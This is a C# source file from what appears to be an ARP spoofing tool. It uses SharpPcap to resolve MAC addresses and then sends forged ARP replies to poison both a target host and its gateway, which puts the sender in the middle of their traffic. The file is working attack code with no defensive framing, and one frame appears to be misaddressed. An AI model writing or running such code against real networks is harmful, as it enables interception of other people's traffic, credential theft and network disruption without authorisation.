using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using PacketDotNet;
using SharpPcap;

namespace ArpSpoof.Core;

/// <summary>
/// Initializes a new instance of the <see cref="PacketBuild"/> class.
/// </summary>
public class PacketBuild
{
    /// <summary>
    /// Get mac address from ip address
    /// </summary>
    public static async Task<string> GetMacAddress(ILiveDevice device, string host, CancellationToken ct)
    {
        try
        {
            var localIp = ((SharpPcap.LibPcap.LibPcapLiveDevice)device).Addresses
                            .FirstOrDefault(a =>
                                a.Addr.ipAddress != null &&
                                a.Addr.ipAddress.AddressFamily == AddressFamily.InterNetwork)
                            ?.Addr.ipAddress;

            var localMac = device.MacAddress;

            var arpPacket = new ArpPacket(
                            ArpOperation.Request,
                            localMac,
                            IPAddress.Parse(host),
                            localMac,
                            localIp);

            var ethernetPacket = new EthernetPacket(
                localMac,
                PhysicalAddress.Parse("FF-FF-FF-FF-FF-FF"),
                EthernetType.Arp);

            ethernetPacket.PayloadPacket = arpPacket;

            string macRes = null;

            var tcs = new TaskCompletionSource<string>();

            device.OnPacketArrival += (object s, PacketCapture e) =>
            {
                var packet = Packet.ParsePacket(e.GetPacket().LinkLayerType, e.GetPacket().Data);
                var arp = packet.Extract<ArpPacket>();

                if (arp != null && arp.SenderProtocolAddress.ToString() == host && arp.Operation == ArpOperation.Response)
                {
                    tcs.TrySetResult(arp.SenderHardwareAddress.ToString());
                }
            };

            // bpf filter
            device.Filter = "arp";

            device.StartCapture();
            device.SendPacket(ethernetPacket);

            using var cts = CancellationTokenSource.CreateLinkedTokenSource(ct);
            cts.CancelAfter(5000);

            try
            {
                macRes = await tcs.Task.WaitAsync(cts.Token);
            }
            catch (OperationCanceledException)
            {
                macRes = null;
            }

            device.StopCapture();
            return macRes ?? throw new InvalidOperationException($"[GetMacFromIP] MAC address not found for the target IP {host}");
        }
        catch (Exception ex)
        {
            throw new InvalidOperationException($"[GetMacAddress] {ex.Message}");
        }
    }

    /// <summary>
    /// Send Spoofed Arp Packet
    /// </summary>
    public static void Spoof(ILiveDevice device, IPAddress targetIp, PhysicalAddress targetMac, IPAddress gatewayIp, PhysicalAddress gatewayMac)
    {
        try
        {
            // reply to the gateway
            var arpRequestToGateway = new ArpPacket(
                ArpOperation.Response,
                device.MacAddress,
                targetIp,
                gatewayMac,
                gatewayIp
            );

            // reply to the target
            var arpRequestToTarget = new ArpPacket(
                ArpOperation.Response,
                device.MacAddress,
                gatewayIp,
                targetMac,
                targetIp
            );

            // Sent to the gateway
            var ethToGateway = new EthernetPacket(device.MacAddress, targetMac, EthernetType.Arp);
            ethToGateway.PayloadPacket = arpRequestToGateway;
            device.SendPacket(ethToGateway);

            // Sent to the target
            var ethToTarget = new EthernetPacket(device.MacAddress, targetMac, EthernetType.Arp);
            ethToTarget.PayloadPacket = arpRequestToTarget;
            device.SendPacket(ethToTarget);

            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine($"[{DateTime.Now}] Sent ARP reply to target: {targetIp} -> {DeviceHelper.FormattedMac(targetMac)}");
            Console.ResetColor();

            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine($"[{DateTime.Now}] * Spoofed * {gatewayIp} -> {DeviceHelper.FormattedMac(targetMac)}");
            Console.ResetColor();
        }
        catch (Exception ex)
        {
            throw new InvalidOperationException($"[Spoof] {ex.Message}");
        }
    }
}
